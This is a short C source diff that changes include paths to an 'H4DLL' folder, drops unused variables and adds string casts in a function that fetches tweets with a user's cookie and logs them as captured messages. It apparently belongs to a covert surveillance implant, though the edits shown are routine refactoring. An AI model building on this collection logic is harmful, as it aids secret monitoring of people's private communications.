@@ -1,12 +1,12 @@
 #include <windows.h>
 #include <stdio.h>
 #include <time.h>
-#include "..\common.h"
-#include "../bss.h"
-#include "..\LOG.h"
+#include "../../H4DLL/common.h"
+#include "../../H4DLL/bss.h"
+#include "../../H4DLL/LOG.h"
 #include "SocialMain.h"
 #include "NetworkHandler.h"
-#include "..\bin_string.h"
+#include "../../H4DLL/bin_string.h"
 
 extern DWORD GetLastFBTstamp(char *user, DWORD *hi_part);
 extern void SetLastFBTstamp(char *user, DWORD tstamp_lo, DWORD tstamp_hi);
@@ -309,10 +309,8 @@ DWORD ParseTweet(char *user, char *cookie)
 	BYTE *r_buffer = NULL;
 	DWORD response_len;
 	char *parser1, *parser2;
-	WCHAR twitter_request[256];
 	char tweet_body[2048];
 	char tweet_id[256];
-	char tweet_ts[256];
 	char screen_name[256];
 	char tweet_author[256];
 	char tweet_timestamp[256];
@@ -444,7 +442,7 @@ DWORD ParseTweet(char *user, char *cookie)
 		_gmtime32_s(&tstamp, (__time32_t *)&act_tstamp);
 		tstamp.tm_year += 1900;
 		tstamp.tm_mon++;
-		LogSocialIMMessageA(CHAT_PROGRAM_TWITTER, "", "", screen_name, "", tweet_body, &tstamp, FALSE); 	
+		LogSocialIMMessageA(CHAT_PROGRAM_TWITTER, (char *)"", (char *)"", screen_name, (char *)"", tweet_body, &tstamp, FALSE); 	
 	}
 
 	SetLastFBTstamp(user, dwHigherBatchTimestamp, 0);
